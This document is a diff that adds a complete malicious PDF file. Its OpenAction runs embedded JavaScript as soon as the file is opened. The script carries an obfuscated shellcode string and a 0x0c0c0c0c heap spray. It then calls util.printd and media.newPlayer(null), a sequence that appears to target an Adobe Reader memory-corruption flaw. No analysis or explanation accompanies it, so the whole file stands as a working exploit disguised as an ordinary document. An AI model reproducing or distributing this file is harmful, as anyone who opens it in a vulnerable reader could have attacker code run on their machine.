@@ -1,0 +1,74 @@
+%PDF-1.5
+%‚„œ”
+1 0 obj
+<</Outlines 2 0 R
+/OpenAction 3 0 R
+/Pages 4 0 R
+/Type /Catalog
+>>
+endobj
+2 0 obj
+<</Count 0
+/Type /Outlines
+>>
+endobj
+4 0 obj
+<</Kids [5 0 R]
+/Count 1
+/Type /Pages
+>>
+endobj
+5 0 obj
+<</Parent 4 0 R
+/MediaBox [0 0 612 792]
+/pdftk_PageNum 1
+/Type /Page
+>>
+endobj
+3 0 obj
+<</JS 6 0 R
+/Type /Action
+/S /JavaScript
+>>
+endobj
+6 0 obj
+<</Length 2092
+>>
+stream
+
+var qdxIsPARawijkD = unescape("%uc3db%u74d9%uf424%u3158%ubbc9%ub4e1%u9ca2%u5eb1%u5831%u8318%u04c0%u5803%u56f5%u7757%ucce5%ubbd2%u97cc%u875b%ud7cf%uf2a8%u3556%ue92a%u526d%u1120%u5d92%ua2c7%u3bf5%uf8b1%u04f8%u676b%uec9b%u4179%u1c0e%uf497%u3304%u66be%u7276%u6352%u66d3%uf4bf%u1dfa%ue955%u981b%u6f30%u0cf1%udac9%u7d81%ud21c%u247b%u813b%u4369%ud1cf%uf94d%u3310%u3edc%ud1a8%u2380%u9de9%u9c4c%ua5d4%u48be%uf6cb%uea03%u40b1%u9103%ufb1e%u5aa3%u6a8c%u7a51%u1634%udc0f%ubc4f%u8435%u5bbd%u6fd3%u38d0%ue1f1%ue1ce%uef62%ueea7%ud011%ud849%u48b0%uc030%ufe9d%u3a88%u3147%u066b%u8c95%u1087%u7f59%ub8cc%u19c0%ue416%ud678%u03f8%uf0db%u57ea%uac3a%u50ea%uc726%u4db5%ud413%ubb7f%ud4fd%u62f5%u739c%u6230%u7f29%u4ee5%u1dcf%u8dfb%u8476%u3456%u7e41%u086c%ue798%uf2bf%uad08%u37f6%ue34a%u0160%u35f4%u3b1f%ufca1%u62fc%u9fbd%u5f34%uaaf2%u2ba3%uebcf%ud71e%u41b8%u7d07%u2937%ue7de%u8bd1%u05e3%udfd4%u2cea%ue23e%u3aee%uf742%u24fb%uf464%u9c11%uef78%udd07%u2d8c%uf527%u3490%ufc25%u2983%u986e%u5a9d%u4778%u67c0%ue17d%u79de%uff72%u8813%ufc98%u9653%u28c6%u9155%u0704%u9969%u501c%ube62%u383b%ud498%ucf49%udc96%ufc2b%uf69d%u0b91%u0ecf%u02dc%u0cf7%u1dd2%u1fd8%u1d18%u463e%uaa8b%u09ca%u7c76%u9d1d%uf5f1%u1b4f%u8c9b%ueffc%u1906%u6267%u8be7%uf602%u30d8%u9aad%u9945%u1b48%u65ef");
+var EdDashDIgmMARzTFDgSvTTZUlJuZmRU = unescape("%u0c0c%u0c0c");
+var TyhHR = unescape("%u0c0c%u0c0c%u4367%u6345%u6958%u6c69%u5859%u704e%u444d%u594f%u784e%u6353%u5457%u784e%u6972%u7265%u5a7a%u6852%u5157%u6d62%u6879%u6c77%u6e55%u5356%u7242%u6648%u456b%u6a58%u6f79%u7a45%u7874%u5456%u6c66%u7844%u764b%u6574");
+
+while(EdDashDIgmMARzTFDgSvTTZUlJuZmRU.length <= 32768) EdDashDIgmMARzTFDgSvTTZUlJuZmRU+=EdDashDIgmMARzTFDgSvTTZUlJuZmRU;
+	EdDashDIgmMARzTFDgSvTTZUlJuZmRU=EdDashDIgmMARzTFDgSvTTZUlJuZmRU.substring(0,32768 - qdxIsPARawijkD.length);
+
+memory=new Array();
+
+for(i=0;i<0x2000;i++) {
+	memory[i]= EdDashDIgmMARzTFDgSvTTZUlJuZmRU + qdxIsPARawijkD;
+}
+
+util.printd("LvdryEwfMTmeCphVejMYFrqjrtGAtOoXRupB", new Date());
+util.printd("ZnKRrNewyQTUFCwqObcZXLUsCASjMnaXIElD", new Date());
+try {this.media.newPlayer(null);} catch(e) {}
+util.printd(TyhHR, new Date());
+
+endstream
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000015 00000 n 
+0000000097 00000 n 
+0000000285 00000 n 
+0000000142 00000 n 
+0000000198 00000 n 
+0000000344 00000 n 
+trailer
+<</Root 1 0 R
+/Size 7
+>>
+startxref
+2487
+%%EOF
